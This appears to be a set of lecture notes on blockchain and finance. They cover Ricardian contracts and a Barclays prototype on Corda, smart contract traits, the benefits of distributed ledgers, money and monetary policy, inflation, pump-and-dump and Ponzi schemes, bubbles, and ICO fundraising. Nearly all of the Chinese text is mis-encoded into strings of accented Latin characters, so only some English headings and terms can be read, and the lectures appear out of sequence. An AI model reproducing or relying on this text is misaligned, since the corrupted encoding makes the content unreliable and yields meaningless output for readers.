æœªæ¥éœ€è¦éªŒè¯è‡ªå·±çš„åˆåŒæ²¡æœ‰ç»è¿‡ä¿®æ”¹çš„è¯å°±å¯ä»¥ï¼š  é‡æ–°ç”¨åŒæ ·çš„ç®—æ³•hashä½ è‡ªå·±çš„æ–‡ä»¶  ç„¶åä¸åˆ†å¸ƒå¼è´¦æœ¬ä¸Šçš„hashè¿›è¡ŒåŒ¹é…å°±å¯ä»¥éªŒè¯äº†ï¼ˆå¯ä¿¡çš„æ˜¯åˆ†å¸ƒå¼è´¦æœ¬ï¼‰   Ricardian Contracts: link legal agreements to code å¯ä»¥å°†æœ‰æ³•å¾‹æ•ˆåº”çš„æ–‡ä»¶è½¬æ¢æˆç”µè„‘ç³»ç»Ÿå¯ä»¥å¤„ç†çš„å½¢å¼ï¼ŒåŒæ—¶åˆå¯ä»¥è½»æ¾çš„è½¬æ¢å›æ¥ä¾›æ³•å¾‹äººå£«é˜…è¯»å’Œä½¿ç”¨ã€‚ æ‰€æœ‰çš„å‚ä¸è€…éƒ½ä¼šç”µå­çš„ç»™åˆåŒç­¾åï¼ŒåŒæ—¶ä½¿ç”¨hashç®—æ³•å°†æ–‡ä»¶ç”µå­çš„ä¿å­˜åœ¨blockchainä¸Šï¼Œä¾›ä»¥å°†æ¥ä½¿ç”¨  Barclayé“¶è¡Œç¬¬ä¸€æ¬¡é‡‡ç”¨äº†è¿™ä¸ªRicardian contractä¸blockchainï¼ˆcordaï¼‰çš„ç»“åˆ https://www.youtube.com/watch?v=YIH4MJf6kH8\u0026t=237s\u0026ab_channel=Rise%2CcreatedbyBarclays ä»–ä»¬å®ç°äº†ä¸€ä¸ªprototypeï¼Œå¯ä»¥å°†ç­¾åˆåŒçš„æ—¶å€™æ‰€éœ€è¦çš„æ³•å¾‹æ–‡ä»¶è½¬æ¢ä¸ºç”µå­ç‰ˆçš„ï¼Œç„¶åå°±äº¤æ˜“çš„åŒæ–¹ä»¥åŠå…¶ä¸­çš„ç»†èŠ‚è¿›è¡Œç®€å•çš„å¡«å……ï¼Œå°±å¯ä»¥å¿«é€Ÿç”ŸæˆåŒä»½çš„å…·æœ‰æ³•å¾‹æ•ˆåº”çš„åˆåŒï¼Œä¹‹åå†ä¸Šä¼ åˆ°cordaçš„blockchainä¹‹ä¸Šï¼Œä¿è¯äº†å…¶ä¸å¯è¢«ä¿®æ”¹çš„æ€§è´¨ è¿˜æ˜¯ä¹‹å‰é‚£ä¸ªç§Ÿæˆ¿åˆåŒçš„ä¾‹å­ï¼Œç°åœ¨æˆ‘ä»¬å¾ˆå¤šçš„åˆåŒè¿˜æ˜¯è¦æ±‚è¦ç”¨æ‰‹å†™ç­¾åä¸ºè¯ï¼Œä½†æ˜¯æœ‰äº†è¿™æ ·çš„smart contract programï¼Œæˆ‘ä»¬å°±å¯ä»¥æ›´ä¸ºæ–¹ä¾¿çš„ç”ŸæˆåˆåŒï¼Œå¹¶æ°¸ä¹…çš„ä¿å­˜ï¼Œä¸”å°†åˆåŒä¿å­˜åœ¨å¯ä»¥ä¿¡ä»»çš„å¹³å°ä¸Šï¼Œæ–¹ä¾¿å†æ¬¡è¿½æº¯ã€‚  Agreements using smart contracts æ™ºèƒ½åˆçº¦å¦‚æœæ˜¯æ”¾åœ¨permissionedè´¦æœ¬ä¸Šçš„è¯ï¼Œé‚£ä¹ˆåªä¼šè¢«å‚ä¸çš„å‡ ä¸ªç”¨æˆ·æœ‰æƒåˆ©æŸ¥çœ‹ å¹¶ä¸”å°±åƒä¹‹å‰æåˆ°è¿‡çš„é‚£æ ·ï¼Œä¸€æ—¦æ™ºèƒ½åˆçº¦å¼€å§‹æ‰§è¡Œï¼Œé‚£ä¹ˆä¸€åˆ‡çš„åæœéƒ½å¿…é¡»è¦æ¥å—ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸€åˆ‡éƒ½æ˜¯å»ºç«‹åœ¨ä½ å·²ç»å®Œå…¨æŒæ¡äº†æ™ºèƒ½åˆçº¦è¦åšçš„äº‹æƒ…ä»¥åŠå°†ä¼šå‘ç”Ÿçš„åæœï¼Œä¸€æ—¦ä¸Šä¼ åˆ°åˆ†å¸ƒå¼è´¦æœ¬ä¹‹åï¼Œä¸€åˆ‡éƒ½ä¸ä¼šæ”¹å˜äº† æ™ºèƒ½åˆçº¦çš„æ–¹æ³•åˆ†ä¸ºä¸¤ç§ï¼š  Gettersï¼Œè·å–å˜é‡  Settersï¼Œé€šè¿‡å¾—åˆ°çš„å˜é‡æ¥æ›´æ”¹EVMçš„çŠ¶æ€   å¾€å¾€è¿™äº›æ™ºèƒ½åˆçº¦ç¨‹åºä¼šè®¾å®šè‡ªåŠ¨çš„å‡½æ•°æ¥è‡ªåŠ¨æé†’ç›¸å…³äººå‘˜ä¸€æ—¦çŠ¶æ€å‘ç”Ÿäº†ä»»ä½•æ”¹å˜ Smart Contract Languages  æ€»ç»“   æ™ºèƒ½åˆçº¦å°±æ˜¯åˆ†å¸ƒå¼è´¦æœ¬ä¸Šè‡ªåŠ¨è¿è¡Œçš„ç¨‹åº   æ¯ä¸€ä¸ªæ™ºèƒ½åˆçº¦ç¨‹åºéƒ½ä¼šåœ¨P2Pç½‘ç»œä¸­çš„æ¯ä¸€ä¸ªfull nodeä¸Šè¢«æ‰§è¡Œ  å…¶ç»“æœå°±æ˜¯æ”¹å˜æ¯ä¸€ä¸ªfull nodeä¸Šçš„virtual machine     æ™ºèƒ½åˆçº¦å¯ä»¥æˆ–è€…ä¸ç”¨ä»£è¡¨å¤šä¸ªå›¢ä½“ä¹‹é—´çš„è¾¾æˆçš„åˆåŒ  æœ‰äº›åªæ˜¯å¼€å‘è€…æ‰€å¼€å‘çš„åº”ç”¨ç¨‹åº     æ¯ä¸€ä¸ªèŠ‚ç‚¹éƒ½ä¼šè¿è¡Œï¼Œä½†æ˜¯å¯èƒ½ä¼šåœ¨ä¸åŒçš„æ—¶é—´å®Œæˆ   è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆæ‰€æœ‰æ™ºèƒ½åˆçº¦ç¨‹åºçš„è¾“å…¥å‚æ•°åªèƒ½åœ¨blockchainå†…éƒ¨è·å–ï¼Œå› ä¸ºå¦‚æœåœ¨å¤–éƒ¨è·å–ï¼Œä¸‡ä¸€å‡ºç°é—®é¢˜ï¼Œé‚£ä¹ˆä¸åŒçš„nodeä¸Šçš„virtual machineçš„ç»“æœä¸åŒï¼Œå°±ä¼šç ´åæ•´ä¸€ä¸ªblockchain   ä¸åŒä½¿ç”¨éšæœºæ•°ï¼Œä¸€åˆ‡éƒ½æ˜¯ç¡®å®šçš„ï¼Œè¦ä¿è¯æ‰€æœ‰çš„EVMéƒ½æ˜¯ç›¸åŒçš„     Lecture 10: Some Case Studies Shared Databases  What are main benefits of DLT   çŠ¶æ€å…±äº« Shared State ä¸åŒçš„ä¼ä¸šéœ€è¦å…±äº«ç›¸åŒçš„æ•°æ®ï¼Œé‚£ä¹ˆDLTå¯ä»¥å¯ä»¥å»ºç«‹ä¸€ä¸ªå¤šæ–¹éƒ½å¯ä»¥ä¿¡ä»»çš„å¹³å°ï¼Œå¹³åˆ‡åœ¨æ‰€æœ‰çš„èŠ‚ç‚¹ä¸Šçš„æ•°æ®éƒ½æ˜¯ç›¸åŒçš„   Stateful(history kept) çŠ¶æ€æ˜¯å®æ—¶æ›´æ–°çš„ keep track the state æ‰€æœ‰çš„çŠ¶æ€å™¶ééƒ½éœ€è¦ç»è¿‡æ‰€æœ‰èŠ‚ç‚¹çš„éªŒè¯ï¼Œè®¤å¯ï¼Œä»¥åŠè®°å½•   Stored data is effectively immutable å­˜å‚¨çš„æ•°æ®å‡ ä¹ä¸å¯èƒ½è¢«æ”¹å˜ æ•°æ®è¢«å­˜å‚¨åœ¨æ‰€æœ‰çš„èŠ‚ç‚¹ä¸Šï¼Œç‰¹åˆ«æ˜¯åœ¨PoWçš„blockchainä¸Šï¼Œå¦‚æœæƒ³è¦ä¿®æ”¹æ•°æ®ï¼Œéœ€è¦æ‰€æœ‰çš„nodeéƒ½åŒæ„ï¼Œå¹¶ä¸”èŠ±è´¹å¤§é‡çš„èµ„æº   Unique allocations \u0026amp; co-ordinated allocation è§£å†³double-spend problem, æ¯ä¸€æ¡transactionéƒ½ä¼šè¢«æ‰€æœ‰çš„èŠ‚ç‚¹è®°å½•ï¼Œå¹¶ä¸”ä¸æ–­è¢«ä¹‹åçš„blockæ‰€è®°å½•ï¼Œdouble-spendéœ€è¦é¢ è¦†è¿™äº›å¾ˆéš¾   Witnessing  Multi-party aggregationï¼Œpermissionedè‡³å°‘éœ€è¦ä¸‰ä¸ªå›¢ä½“ï¼Œå…¶ä¸­ä¸€ä¸ªä½œä¸ºç›‘ç£     Immediate settlement for digital assets change of custodyéƒ½ä¼šè¢«è®°å½•    NFT Lecture 5: Money and e-Money Moneyåœ¨ç°ä»£æœ‰ä¸¤ç§åŸºæœ¬çš„å½¢å¼  ç¡¬å¸  çº¸é’   åŒæ ·è¿˜æœ‰ æ—…è¡Œæ”¯ç¥¨ é“¶è¡Œæ´»æœŸå­˜æ¬¾ å‚¨è“„å­˜æ¬¾ å®šæœŸå­˜æ¬¾ï¼ˆ24å°æ—¶å¹´ï¼‰ è´§å¸å¸‚åœºå­˜æ¬¾ï¼ˆå•†ä¸šå€Ÿè´·) Moneyåœ¨è‹±å›½çš„åˆæ³•è§£é‡Š   Top-Down è‡ªä¸Šè€Œä¸‹ï¼š  æ”¿åºœè¯´ä»€ä¹ˆæ˜¯é’±ï¼Œä»€ä¹ˆå°±æ˜¯é’±  Legal Tenderæ³•å®šè´§å¸  fiat money æ³•å®šè´§å¸     Bottom-Up è‡ªä¸‹è€Œä¸Šï¼š  è€ç™¾å§“è¯´ä»€ä¹ˆæ˜¯é’±ï¼Œä»€ä¹ˆå°±æ˜¯é’±  Promissory notesä»18å®é™…ä¸­æœŸå¼€å§‹æµè¡Œï¼Œåœ¨19ä¸–çºªè¢«è‹±å›½æ³•é™¢æ‰€æ¥å—     Moneyçš„ç§ç±»  Commodity money å•†å“è´§å¸  å…¶ä»·å€¼æ¥æºäºåˆ¶é€ ææ–™æœ¬èº«çš„ä»·å€¼  é€šå¸¸æ˜¯é‡‘å±(é‡‘é“¶é“œ)  Yap Rai stones      Representative Money ä»£è¡¨æ€§è´§å¸  ä»·å€¼æ¥æºäºå…¶æ‰€ä»£è¡¨çš„åŸºç¡€å•†å“çš„å›½å¸  å¯¹å•†å“çš„è¦æ±‚ï¼šé‡‘æœ¬ä½    Fiat Money æ³•å®šè´§å¸   æ²¡æœ‰ä»»ä½•å†…åœ¨ä»·å€¼çš„è´§å¸ï¼Œä¹Ÿæ²¡æœ‰åŸºç¡€å•†å“   å…¶ä»·å€¼æ¥æºäºç”¨æˆ·çš„è®¤å¯   ä¹Ÿå¯ä»¥è¯´æ˜¯è€ç™¾å§“è®¤åŒäº†æ”¿åºœé¢å‘çš„Top-Downè‡ªä¸Šè€Œä¸‹çš„è´§å¸     Moneyçš„ä¸»è¦åŠŸèƒ½   ä½œä¸ºäº¤æ˜“çš„ç»ˆç»“  å‡å°‘äº†ä»¥ç‰©æ¢ç‰©çš„éº»çƒ¦     ç”¨äºå•†å“è¡¡é‡æœºåˆ¶çš„æ ‡å‡†ï¼Œä¹Ÿæ˜¯è®°è´¦çš„å•ä½   ä»·å€¼çš„å­˜å‚¨  å¦‚æœæ²¡æœ‰é€šè´§è†¨èƒ€çš„è¯ï¼Œå¯ä»¥ä¸€ç›´ä¿æŒä»·å€¼     ä½œä¸ºåŒ¿åæ”¯ä»˜çš„æ‰‹æ®µ   ä½œä¸ºå»¶è¿Ÿäº¤ä»˜çš„æ‰‹æ®µ   Moneyçš„æ¬¡è¦åŠŸèƒ½   å¯å˜æ€§  çº¸å¸/ç¡¬å¸æ˜¯å¯ä»¥äº’æ¢çš„  ä¸åƒï¼ˆæ¯”å¦‚ï¼‰é’»çŸ³æˆ–ç¨€æœ‰é‚®ç¥¨       å¯æºå¸¦æ€§  ä¸åƒæˆ¿å±‹æˆ–åœŸåœ°é‚£æ ·     è€ç”¨æ€§   çº¸è´¨é’ç¥¨ä¸å¡‘æ–™é’ç¥¨   æ¯”å¦‚è¯´ã€‚æ¾³å¤§åˆ©äºšçš„ç¬¬ä¸€å¼ èšåˆç‰©ç¾å…ƒçº¸å¸ã€‚     å¯åˆ†å‰²æ€§  ä¸ç‰›ä¸åŒ     å¯éªŒè¯æ€§   éœ€è¦éªŒè¯çœŸå®æ€§   ä½¿ç”¨æ°´å°ã€å…¨æ¯å›¾     å‚¨å­˜æ€§  ä¸ç‰›ä¸åŒï¼ˆç‰›æœ€ç»ˆä¼šæ­»ï¼‰ã€‚     ä¸å®¹æ˜“ä¼ªé€   ä½¿ç”¨æ°´å°ã€å…¨æ¯å›¾ã€‚     ä»€ä¹ˆæ˜¯Moneyçš„ä»·å€¼ åœ¨æ³•å®šè´§å¸ä¸­ï¼Œå…¶ä»·å€¼å–å†³äºäººæ°‘æ˜¯å¦æ„¿æ„æ¥å—å…¶ä½œä¸ºæ”¯ä»˜æ‰‹æ®µ ä¸»è¦æ˜¯ç”±äººæ°‘çš„æ€åº¦å†³å®š  ç”±ä»€ä¹ˆæ”¿åºœé¢å‘çš„  å¯¹å…¶è´§å¸æ”¿ç­–çš„æ€åº¦   åœ¨é€šè´§è†¨èƒ€æˆ–è€…é€šè´§ç´§ç¼©ä¹‹ä¸‹ï¼Œäººæ°‘ä¼šåšå‡ºå“åº”çš„åŠ¨ä½œæ¥è¡¨è¾¾ä»–ä»¬å¯¹äºè´§å¸ä»·å€¼çš„æ€åº¦ï¼š   åœ¨é«˜é€šè´§è†¨èƒ€ç‡ä¸‹ï¼Œåšå€ºåŠ¡äººæ¯”åšå€ºæƒäººæ›´å¥½   å€Ÿé’±è€Œä¸æ˜¯æ”¾é’±   ä»–ä»¬å¯èƒ½è¯•å›¾å°†å‚¨è“„è½¬åŒ–ä¸ºå…¶ä»–èµ„äº§ã€‚   è´§å¸çš„æµé€šæ€§ Liquidity refers to the speed \u0026amp; ease with which an asset can be turned into cash without lowering its price æµåŠ¨æ€§æŒ‡çš„æ˜¯å¦‚ä½•å°†å®é™…èµ„äº§ä¸ç°é‡‘ä¹‹é—´çš„è½¬æ¢é€Ÿåº¦ä»¥åŠéš¾æ˜“ç¨‹åº¦ï¼ˆåœ¨ä¸å½±å“ä»·æ ¼çš„æƒ…å†µä¸‹ï¼‰  ç°é‡‘çš„æµé€šæ€§æ˜¯æœ€å¥½çš„  è´µé‡‘å±ä¹Ÿè¿˜å¯ä»¥  è™šæ‹Ÿè´§å¸çš„æµé€šæ€§ä¹Ÿè¿˜ä¸é”™  ä½†æ˜¯æˆ¿å­æˆ–è€…å…¶ä»–å®é™…çš„èµ„äº§çš„æµé€šæ€§å°±å¾ˆå·®ï¼Œå› ä¸ºä¸æ˜¯æ‰€æœ‰äººéƒ½æƒ³è¦è¿™ä¸ªèµ„äº§ï¼ŒåŒæ—¶ï¼Œä»–ä»¬çš„ä»·å€¼ä¹Ÿè¿˜éœ€è¦è¯„ä¼°   Moneyåœ¨é‡‘èä¸­çš„å®šä¹‰ MÃ˜ = æµé€šä¸­çš„ç¡¬å¸å’Œçº¸å¸ + é“¶è¡Œå‚¨å¤‡åŸºé‡‘ï¼ˆè‹±å›½ï¼‰ï¼ˆç§°ä¸ºç‹­ä¹‰è´§å¸ï¼‰ MB = MÃ˜ + é“¶è¡Œé‡‘åº“ä¸­çš„ç¡¬å¸å’Œçº¸å¸ï¼ˆç§°ä¸ºè´§å¸åŸºç¡€ï¼‰ M1 = æµé€šä¸­æˆ–é‡‘åº“ä¸­çš„ç¡¬å¸å’Œçº¸å¸ + æ—…è¡Œæ”¯ç¥¨ + æ´»æœŸå­˜æ¬¾ + å…¶ä»–å¯æ”¯ç¥¨å­˜æ¬¾ M2 = M1 + å‚¨è“„å­˜æ¬¾ + 10ä¸‡ç¾å…ƒä»¥ä¸‹å®šæœŸå­˜æ¬¾ M3 = M2 + è´§å¸å¸‚åœºåŸºé‡‘ + è¾ƒé•¿æœŸçš„å­˜æ¬¾ MZM = M3 + æ‰€æœ‰è´§å¸å¸‚åœºåŸºé‡‘ã€‚ å‘æ”¾Money åœ¨å¤§å¤šæ•°å›½å®¶åªæœ‰ç”±æ”¿åºœæ§åˆ¶çš„ä¸­å¿ƒé“¶è¡Œæ‰æœ‰èµ„æ ¼å‘æ”¾è´§å¸ å…·ä½“å¦‚ä½•å‘æ”¾å‘¢ï¼š   é“¸é€ ç¡¬å¸   å°åˆ·çº¸å¸   å°†ç”µå­å­˜æ¬¾å­˜å…¥å•†ä¸šé“¶è¡Œçš„è´¦æˆ·   è¿›å…¥å•†ä¸šé“¶è¡Œçš„Nostroè´¦æˆ·   ç”¨æŠµæŠ¼å“ï¼ˆä¾‹å¦‚ï¼Œé“¶è¡Œæ‹¥æœ‰çš„åœŸåœ°ã€å»ºç­‘ç‰©ï¼‰ä½œæ‹…ä¿   ç„¶åï¼Œé“¶è¡Œå¯ä»¥æŠŠè¿™äº›é’±å€Ÿå‡ºã€‚   è´§å¸æ”¿ç­– å¤§å¤šæ•°çš„é“¶è¡Œéƒ½æœ‰æ˜ç¡®çš„ç›®æ ‡ï¼Œä¾‹å¦‚  å°†é€šè´§è†¨èƒ€ä¿æŒåœ¨ä¸€ä¸ªç¨³å®šçš„æ ‡å‡†  æ‰©å¤§å°±ä¸šï¼ˆè®©é“¶è¡Œä¸­çš„é’±è´¬å€¼ï¼Œäººä»¬æ‰ä¼šæ„¿æ„å»èµšé’±ï¼‰  ç¼“å’Œé•¿æœŸåˆ©ç‡   ä¸ºäº†å®ç°è¿™äº›ç›®æ ‡ï¼Œä»–ä»¬å¯ä»¥é€šè¿‡å½±å“è´§å¸çš„æ•°é‡æ¥è¾¾åˆ°è¿™ä¸ªç›®çš„ï¼š  é€šè¿‡å‘è¡Œè´§å¸  é€šè¿‡è¦æ±‚å•†ä¸šé“¶è¡Œåœ¨ä¸­å¤®é“¶è¡Œå­˜æ”¾å®‰å…¨èµ„é‡‘ï¼ˆ\u0026ldquo;å‚¨å¤‡é‡‘\u0026rdquo;ï¼‰ã€‚  é€šè¿‡è®¾å®šåŸºæœ¬åˆ©ç‡ï¼ˆ\u0026ldquo;åŸºå‡†åˆ©ç‡\u0026rdquo;ï¼‰ï¼ˆè‹±å›½ï¼š0.50%ï¼‰ã€‚  é€šè¿‡å°†ç”µå­è´§å¸å­˜å…¥å•†ä¸šé“¶è¡Œçš„é“¶è¡Œè´¦æˆ·ï¼ˆ\u0026ldquo;é‡åŒ–å®½æ¾\u0026rdquo;ï¼‰ã€‚  é€šè¿‡å…¬å¼€å¸‚åœºæ“ä½œï¼ˆOMOï¼‰  è´­ä¹°å’Œå‡ºå”®å€ºåˆ¸  ä»è€Œä»ç»æµä¸­é‡Šæ”¾æˆ–æå–èµ„é‡‘ã€‚   å¯¹äºè´§å¸æ”¿ç­–çš„ä¿¡æ¯å…±äº« æ”¿åºœä¸€èˆ¬ä¼šå¯¹äºä¿¡æ¯çš„å…±äº«éå¸¸å°å¿ƒï¼Œå› ä¸ºä¸€ä¸ªæ™®é€šçš„æ¶ˆæ¯ï¼Œå¾ˆå®¹æ˜“é€ æˆæ°‘ä¼—çš„è¿‡åº¦è§£è¯»ä¸è¿‡åº¦ååº”ï¼Œè¿›è€Œå¼•èµ·ææ…Œ Inflation and Hyperinflation é€šè´§è†¨èƒ€å’Œæ¶æ€§é€šè´§è†¨èƒ€ å¦‚æœé“¶è¡Œå‘è¡Œè¿‡å¤šçš„è´§å¸ï¼ˆæˆ–ä½¿è´·æ¬¾è¿‡äºå®¹æ˜“ï¼‰ï¼Œé‚£ä¹ˆ   å¯ç”¨çš„è´§å¸å¤šäºè¦è´­ä¹°çš„å•†å“ï¼ˆè‡³å°‘åœ¨çŸ­æœŸå†…ï¼‰ã€‚   å•†å“çš„ä»·æ ¼ä¸Šå‡ï¼ˆå› ä¸ºå¯¹å®ƒä»¬çš„éœ€æ±‚è¶…è¿‡äº†ä¾›åº”ï¼‰ã€‚   å•†å“çš„å¹³å‡ä»·æ ¼ä¸Šå‡ï¼Œå› æ­¤æˆ‘ä»¬å¾—åˆ°äº†é€šè´§è†¨èƒ€   æ¯å•ä½æ—¶é—´å†…çš„ä»·æ ¼ä¸Šæ¶¨ç‡ã€‚   é€šè´§è†¨èƒ€çš„æ°´å¹³æ²¡æœ‰ä¸Šé™ æ¶æ€§é€šè´§è†¨èƒ€:å½“é€šè´§è†¨èƒ€ç‡æ¯æœˆè¶…è¿‡50%ã€‚ åŠ å¯†è´§å¸çš„ä½œç”¨  äº¤æ˜“åª’ä»‹  ä»·å€¼çš„è¡¡é‡æ ‡å‡†ä¸è®°è´¦å•ä½  ä»·å€¼çš„å­˜å‚¨  åŒ¿åæ”¯ä»˜  å»¶æœŸæ”¯ä»˜   ä½†æ˜¯ï¼ŒåŠ å¯†è´§å¸çš„ç¨³å®šæ€§ä¸å…¶å¯¹ç°å®ä¸–ç•Œå•†å“ä»¥åŠæœåŠ¡çš„è´­ä¹°å’Œå–å‡ºçš„å…³ç³»æˆåæ¯” ä½œä¸ºä¸€ç§å­˜å‚¨åª’ä»‹ï¼ŒåŠ å¯†è´§å¸å¯¹è·¨å›½è½¬ç§»èµ„äº§çš„äººæ¥è¯´å¯èƒ½ç‰¹åˆ«æœ‰ä»·å€¼ åŠ å¯†è´§å¸çš„ç”¨æˆ·  çŠ¯ç½ªè€…ï¼Œæ´—é’±  é€ƒé¿å›½é™…åˆ¶è£çš„æ”¿åºœå’Œäººæ°‘  å¤„äºèµ„äº§å‡ºå£ç®¡åˆ¶ï¼Œæ¶æ€§é€šè´§è†¨èƒ€æˆ–è€…é«˜åº¦è…è´¥çš„å›½å®¶çš„äººæ°‘  ä»»ä½•æœ‰ä½¿ç”¨è´§å¸åˆæ³•/ä¸åˆæ³•éœ€æ±‚çš„äºº  æŠ•èµ„è€…   åŠ å¯†è´§å¸åœ¨2017å¹´çš„å¢é•¿  ä¸åˆæ³•äº¤æ˜“çš„å¢åŠ   ICO  å¤§ä¼—è¡Œä¸º   Herd behaviours ä»ä¼—è¡Œä¸º äººä»¬ä¼šå€¾å‘äºæ¨¡ä»¿åˆ«äºº Pump \u0026amp; dump scams  æŠ½æ°´å’Œå€¾å€’éª—å±€  è¯ˆéª—è€…è´­ä¹°è‚¡ç¥¨ï¼ˆæˆ–åŠ å¯†è´§å¸ï¼‰å¹¶å‘å…¶ä»–äººæ¨é”€ã€‚  å½“å…¶ä»–äººä¹°å…¥æ—¶ï¼Œä»·æ ¼ä¸Šå‡  è¯ˆéª—è€…ä»¥é«˜äºä»–/å¥¹æ”¯ä»˜çš„ä»·æ ¼å–å‡º    åºæ°éª—å±€   éª—å­æ‹›æ½æŠ•èµ„åŸºé‡‘ï¼Œæ‰¿è¯ºå¿«é€Ÿå’Œé«˜é¢å›æŠ¥   æ—©æœŸæŠ•èµ„è€…ä»åæœŸæŠ•èµ„è€…çš„æŠ•èµ„ä¸­è·å¾—å›æŠ¥   ç”±äºä¸–ç•Œäººå£æ˜¯æœ‰é™çš„ï¼Œè¿™æ ·çš„éª—å±€æ€»è¦ç»“æŸã€‚     æ³¡æ²«ç»æµ Bubbles æ³¡æ²«ç»æµï¼ŒæŒ‡èµ„äº§ä»·å€¼è¶…è¶Šå®ä½“ç»æµï¼Œææ˜“ä¸§å¤±æŒç»­å‘å±•èƒ½åŠ›çš„å®è§‚ç»æµçŠ¶æ€ã€‚ æ³¡æ²«ç»æµç»å¸¸ç”±å¤§é‡æŠ•æœºæ´»åŠ¨æ”¯æ’‘ï¼Œæœ¬è´¨å°±æ˜¯è´ªå©ªã€‚ ç”±äºç¼ºä¹å®ä½“ç»æµçš„æ”¯æ’‘ï¼Œå› æ­¤å…¶èµ„äº§çŠ¹å¦‚æ³¡æ²«ä¸€èˆ¬å®¹æ˜“ç ´è£‚ï¼Œå› æ­¤ç»æµå­¦ä¸Šç§°ä¹‹ä¸ºâ€œæ³¡æ²«ç»æµâ€ã€‚ æ–°å…´äº§ä¸šå¤„äºæ—©æœŸçš„æ—¶å€™ï¼Œäººä»¬å¼€å§‹ç‚’ä½œå•†å“ï¼Œèµ‹äºˆå…¶è¿‡é«˜çš„ä»·å€¼ ä¸€æ—¦æŠ•æœºè€…ä¸§å¤±äº†æŠ•æœºçš„æ¬²æœ›ï¼Œå¼€å§‹æ’¤å‡ºä»–ä»¬çš„èµ„é‡‘ï¼Œé‚£ä¹ˆè¢«å“„æŠ¬çš„å•†å“ä»·æ ¼æœºä¼šé¢ä¸´å¤§é‡çš„ä¸‹é™ï¼Œæœ€ç»ˆå¯¼è‡´æ³¡æ²«ç ´è£‚ï¼Œæ‰‹ä¸­çš„æ³¡æ²«ä¸å€¼é’±äº†ï¼Œè´·æ¬¾å´è¿˜è¿˜ä¸æ¸… è™šæ‹Ÿè´§å¸çš„ä»·å€¼ éœ€è¦è€ƒè™‘çš„æ–¹é¢  ä¾›åº”æ–¹  ä¾›åº”é‡æ˜¯å¦å›ºå®š  æ¯”å¦‚æ¯”ç‰¹å¸çš„å‘è¡Œæ€»é‡ç›®å‰æ˜¯ç”±ä¸Šä¸Šé™    éœ€æ±‚æ–¹ æ˜¯å¦æœ‰ä¸€ä¸ªä¼šäº§ç”Ÿéœ€æ±‚çš„åŸºç¡€åº”ç”¨ï¼Ÿ å¦‚æœæœ‰ä¸€ä¸ªåŸºç¡€åº”ç”¨ï¼Œéœ€æ±‚å¯èƒ½æ˜¯ä»€ä¹ˆï¼Ÿ   åœ¨çŸ­æœŸå’Œé•¿æœŸå†…   æ˜¯å¦æœ‰ç±»ä¼¼æˆ–ç«äº‰çš„ä»£å¸ï¼Ÿ   æ˜¯å¦æœ‰æ¥è‡ªæŠ•èµ„è€…çš„éœ€æ±‚ï¼ˆæˆ–å¯èƒ½æœ‰ï¼‰ï¼Ÿ ä¾›åº”å’Œéœ€æ±‚ä¹‹é—´çš„å¹³è¡¡ï¼Ÿ ä¾›åº”å’Œéœ€æ±‚æ˜¯å¦‚ä½•åŒ¹é…çš„ï¼Ÿ å…¶ä»–ç±»ä¼¼åŠ å¯†è´§å¸çš„ä»·æ ¼æ˜¯å¤šå°‘ï¼Ÿ   Lecture 7: ICOs and TGEs Raising Funds   åˆ›ä¸šå…¬å¸å¦‚ä½•æ”¶é›†èµ„é‡‘\n FF\u0026amp;F: åˆ›å§‹äººï¼Œæœ‹å‹å’Œå®¶äºº  å¤©ä½¿æŠ•èµ„äºº  æ”¿åºœæ‹¨æ¬¾æˆ–è€…è´·æ¬¾  å•†ä¸šè´·æ¬¾ï¼ˆé“¶è¡Œï¼‰  é£é™©æŠ•èµ„å…¬å¸  IPOï¼šå½“å…¬å¸åœ¨æ­£ç¡®äº¤æ˜“æ‰€ä¸Šå¸‚çš„æ—¶å€™ï¼Œå°±å¯ä»¥é€šè¿‡å‡ºå”®è‚¡ä»½æ¥å‹Ÿé›†èµ„é‡‘       å¯»æ‰¾è´·æ¬¾æˆ–è€…æŠ•èµ„äºº\n  å‘å¸ƒæ‹›è‚¡è¯´æ˜ä¹¦ ä¸€ä»½åŒ…å«æœºä¼šï¼Œterms and conditions (T\u0026amp;C) ä»¥åŠé£é™©çš„æ–‡æ¡£   ä¼ ç»Ÿçš„å€Ÿè´·å½¢å¼   å­˜å‚¨è€…å°†é’±å­˜å…¥é“¶è¡Œï¼Œä¿¡ç”¨ç¤¾   é“¶è¡Œç”¨è¿™äº›é’±å‘ä¸ªäººæˆ–è€…å…¬å¸æä¾›å¤§é¢è´·æ¬¾     ä¼—ç­¹èµ„é‡‘   é€šè¿‡ä¼—ç­¹æœåŠ¡ä»¥åŠç½‘ç«™å‹Ÿé›†èµ„é‡‘   é€šè¿‡å¤§æ•°é‡çš„æŠ•èµ„è€…æŠ•èµ„çš„å°é¢èµ„é‡‘     P2Pè´·æ¬¾   ICO é¢„å…ˆå‡ºå”®ä»£å¸     ICOs and TGEs   ä»€ä¹ˆæ˜¯ICOï¼Ÿ\nICOæ˜¯ä¸€ç§å‹Ÿé›†èµ„é‡‘çš„æ–¹æ³• ä¸¾ä¸€ä¸ªä¾‹å­ï¼Œæ¯”å¦‚æˆ‘ä»¬å°†è¦å¼€è®¾ä¸€æ¡æ–°çš„èˆªçº¿ï¼Œé‚£ä¹ˆå»ºè®¾èˆªçº¿éœ€è¦æ—¶é—´ä¸èµ„é‡‘ï¼Œæˆ‘ä»¬é€šè¿‡å‘æ”¾crypto tokenä»£å¸æ¥äº¤æ¢æŠ•èµ„è€…çš„èµ„é‡‘æ”¯æŒ æŠ•èµ„è€…é€šè¿‡æ”¯æŒèµ„é‡‘ï¼Œå°±ä¼šè·å¾—ä¸€å®šé‡çš„ä»£å¸ åœ¨é¡¹ç›®ç»“æŸä¹‹åï¼Œä»–ä»¬å°±å¯ä»¥è¿›è¡Œå¯¹ä»£å¸çš„è´¸æ˜“ Why invest? â€“ Business or utility reason â€“ Investment reasons â€¢ to hold tokens and resell them later æŒæœ‰ä»£å¸å¹¶åœ¨æ—¥åè½¬å”®ï¼ˆæŠ•èµ„ç„¶åè·å¾—å›æŠ¥ï¼‰ â€“ Speculation reasons â€¢ to buy and sell tokens. è´­ä¹°å’Œå‡ºå”®ä»£å¸ï¼ˆç”¨æ¥è·å–ä»£å¸ï¼‰      Token standards: ERC\nEthereum Request for Comment ä»»ä½•äººéƒ½å¯ä»¥è®¡å…¥å¹¶æä¾›ä»–ä»¬çš„æƒ³æ³•ï¼Œç„¶åè®©å…¶ä»–äººè®¨è®ºå¹¶æŠ•å…¥èµ„é‡‘ 